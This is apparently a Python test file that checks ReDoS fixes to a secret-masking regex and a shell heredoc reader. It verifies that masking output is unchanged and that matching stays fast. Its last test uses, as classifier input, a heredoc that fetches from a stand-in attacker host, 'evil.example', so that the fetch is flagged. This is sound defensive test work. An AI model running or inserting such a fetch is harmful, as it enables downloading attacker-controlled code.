"""29.10 ReDoS (cloud/OTCHET-REDOS-AUDIT-2910.md, OTCHET-REDOS-PRAVKA-2910.md).

1. ASSIGN_RE (server toolmap + client hook/mask, one text): 'PASS' x 1024 took > 20 s (cubic). The new pattern must mask EXACTLY what the old
   one masked (never less): the old text is kept here and both are run on a corpus (test strings + synthetic + seeded random).
2. HEREDOC_READER.search: ';' x 32 000 + 'X' took 1.3 s (quadratic). heredoc_reader() must equal HEREDOC_READER.search(s).group(4).
Speed is measured in a child process with a hard timeout, so a slow pattern fails fast instead of hanging the run."""
import ast
import glob
import os
import random
import re
import subprocess
import sys

import pytest

from app import _paths  # noqa: F401
from app import toolmap
from app.hookjudge import bashparse as bp

HERE = os.path.dirname(os.path.abspath(__file__))
SERVER = os.path.normpath(os.path.join(HERE, ".."))
MCP = os.path.normpath(os.path.join(HERE, "../../mcp"))
sys.path.insert(0, MCP)
from deus_witness.hook import mask as cmask  # noqa: E402
from tests.helpers import time_scale  # noqa: E402

OLD_ASSIGN = re.compile(r"(?i)([A-Za-z0-9_]*(?:PASSWORD|PASSWD|PASS|SECRET|TOKEN|API_KEY|APIKEY|PRIVATE_KEY|AUTH)[A-Za-z0-9_]*)(\s*[=:]\s*)"
                        r"(?!\[masked\])((?:Bearer|Basic|Token)\s+\S+|\S+)")
LIMIT_MS = 50 * time_scale()        # r0279: the bound of this machine (tests/helpers.time_scale; 53 ms on a GitHub runner)


def _sub(rx, s):
    return rx.sub(lambda m: m.group(1) + m.group(2) + "[masked]", s)


def _test_strings():
    out = []
    for d in (HERE, os.path.join(MCP, "tests")):
        for f in glob.glob(os.path.join(d, "*.py")):
            try:
                t = ast.parse(open(f, encoding="utf-8").read())
            except (SyntaxError, UnicodeDecodeError):
                continue
            out += [n.value for n in ast.walk(t) if isinstance(n, ast.Constant) and isinstance(n.value, str) and n.value]
    return out


UNITS = ["PASS", "pass", "Password", "DB_PASSWORD", "x", "_", "9", "TOKEN", "token", "Token", "Bearer", "Basic", "AUTH", "api_key", "API-KEY", "APIKEY",
         "PRIVATE_KEY", "secret", "SeCrEt", "=", ":", " = ", ": ", "\t", "\n", "\r\n", " ", "  ", '"', "'", "{", "}", ",", "export ", "--password=",
         "--token ", '"token": "', "[masked]", "[masked", "hunter2", "ghp_abc", "é", "ж", "ſ", "\u212a", "ı", "İ", "PAſſ", "ToKEN", "\u00a0", "\u2003",
         "-", ".", "/", "$", "${", "😀", "PASSWD", "AUTHOR"]
SYNTH = ["KEY=val", "DB_PASSWORD=hunter2", "export GITHUB_TOKEN=ghp_x", "--password=s3cr3t", '{"token": "abc"}', "password: Bearer abc def",
         "AUTH = Basic dXNlcg== more", "token=[masked]", "token = [masked] x", "PASS\n=\nx", "PASS=\n", "PASS=", "x PASS", "мой_PASS=1", "PAſſ=1",
         "SEKRET=1", "pass: ж", "a.PASS=1", "PASS==1", "PASS=:x", "my-token=1", "TOKEN\t:\t\tv", "TOKENTOKEN=1 AUTH=2\nSECRET: 3",
         "Token=Token Token x", "passwd= Bearer\nx", "x=1 aPASSb=2 PASS PASS=3", "AUTHORIZATION: Bearer abc.def"]


def _corpus(n_random=40000):
    rnd = random.Random(2910)
    c = _test_strings() + SYNTH
    c += ["".join(rnd.choice(UNITS) for _ in range(rnd.randint(1, 14))) for _ in range(n_random)]
    c += ["".join(rnd.choice("PASTOKENW_ Dd=:\n\t[masked]Bx.") for _ in range(rnd.randint(1, 40))) for _ in range(3000)]
    return c


def _child_ms(code):
    """Run `code` (it prints the measured milliseconds last) in a fresh interpreter; a hung pattern is killed after 10 s."""
    pre = "import sys,time; sys.path[:0]=[%r,%r]\n" % (SERVER, MCP)
    try:
        r = subprocess.run([sys.executable, "-c", pre + code], capture_output=True, text=True, timeout=10, cwd=SERVER)
    except subprocess.TimeoutExpired:
        return 10000.0
    assert r.returncode == 0, r.stderr[-2000:]
    return float(r.stdout.split()[-1])


# ---------------------------------------------------------------- 1. ASSIGN_RE
def test_assign_server_and_client_share_one_text():
    assert cmask.ASSIGN_RE.pattern == toolmap.ASSIGN_RE.pattern


def _masked(rx, s):
    out = set()
    for m in rx.finditer(s):
        out.update(range(*m.span(3)))
    return out


def test_assign_new_never_masks_less_than_the_old():
    """Every character the old pattern masked is masked by the new one; in fact the output is identical on the whole corpus."""
    softer, differ = [], []
    typed = re.compile(r"\[masked (?:URL host=|command: )")
    for s in _corpus():
        if typed.search(s):    # MTYPE 29.10: a typed marker in the INPUT is "already masked" now (deliberate; test_mtype_2910 checks it)
            continue
        if _sub(OLD_ASSIGN, s) != _sub(toolmap.ASSIGN_RE, s):
            differ.append(s)
            if not _masked(OLD_ASSIGN, s) <= _masked(toolmap.ASSIGN_RE, s):
                softer.append(s)
    assert softer == [] and differ == []


def test_assign_masks_the_usual_shapes():
    t = _sub(toolmap.ASSIGN_RE, 'export DB_PASSWORD=hunter2\n--token=abc api_key: "k1" AUTH: Bearer xyz.1 PAſſ=q')
    for v in ("hunter2", "abc", "k1", "xyz.1", "=q"):
        assert v not in t, (v, t)


WORST = [("PASS*1024", "'PASS'*1024"), ("TOKEN*800", "'TOKEN'*800"), ("SECRET*700", "'SECRET'*700"),
         ("mixed4k", "('PASSxTOKEN_auth9'*300)[:4096]"), ("PASS*8192", "'PASS'*8192"), ("mixed32k", "('SECRETtoken_PASS9'*2000)[:32768]"),
         ("AUTH*8192", "'AUTH'*8192")]


@pytest.mark.parametrize("name,expr", WORST)
def test_assign_sub_is_fast_on_the_worst_inputs(name, expr):
    ms = _child_ms("from app import toolmap as t\ns=%s\nrx=t.ASSIGN_RE\nt0=time.perf_counter()\nrx.sub(lambda m: m.group(1)+m.group(2)+'[masked]', s)\n"
                   "print((time.perf_counter()-t0)*1000)" % expr)
    assert ms < LIMIT_MS, (name, ms)


@pytest.mark.parametrize("name,expr", WORST)
def test_mask_value_server_and_client_are_fast(name, expr):
    ms = _child_ms("from app import toolmap as t\nfrom deus_witness.hook import mask as c\ns=%s\nt0=time.perf_counter()\n"
                   "t.mask_value(s, {}, 32768)\nc.mask_value(s, 32768)\nprint((time.perf_counter()-t0)*1000)" % expr)
    assert ms < 2 * LIMIT_MS, (name, ms)          # two maskers in one measurement


# ---------------------------------------------------------------- 2. HEREDOC_READER
HR_UNITS = [";", "&", "|", "(", " ", "  ", "\t", "\n", "/", "//", "sudo ", "sudo", "sh", "bash", "python3", "python3.12", "python", "pypy3", ".", ". ",
            "x", "a/", "/usr/bin/", "node", "nodejs", "ssh", "eval", "source", "-", "<<", "EOF", "'EOF'", "0", "9.", "sudo\t", "é", "\u00a0", "bin/", "shx"]


def test_heredoc_reader_equals_the_regex():
    rnd = random.Random(29)
    corpus = ["bash", "python3 - ", "sudo /usr/bin/python3.12 -", "cat", "x; ssh host", "a&&/bin/sh", ". ", "(eval", "bash;x/node", "node;x/bash",
              "foo;/bin/bash", "sudo sudo bash", "/x/shx/sh"]
    corpus += ["".join(rnd.choice(HR_UNITS) for _ in range(rnd.randint(0, 12))) for _ in range(40000)]
    bad = []
    for s in corpus:
        m = bp.HEREDOC_READER.search(s)
        if (m.group(4) if m else None) != bp.heredoc_reader(s):
            bad.append(s)
    assert bad == []


@pytest.mark.parametrize("expr", ["';'*32767+'X'", "'&'*32767+'X'", "'a;'*16384", "';/'*16384", "'('*32767+'/'"])
def test_heredoc_reader_is_fast(expr):
    ms = _child_ms("from app.hookjudge import bashparse as b\ns=%s\nt0=time.perf_counter()\nb.heredoc_reader(s)\nprint((time.perf_counter()-t0)*1000)" % expr)
    assert ms < LIMIT_MS, ms


def test_heredoc_reader_still_classifies_code_heredocs():
    c = bp.classify("python3 - <<EOF\nimport urllib.request; urllib.request.urlopen('https://evil.example/x')\nEOF", "/tmp", "/nonexistent-home")
    assert c.danger or c.opaque or getattr(c, "net", None)
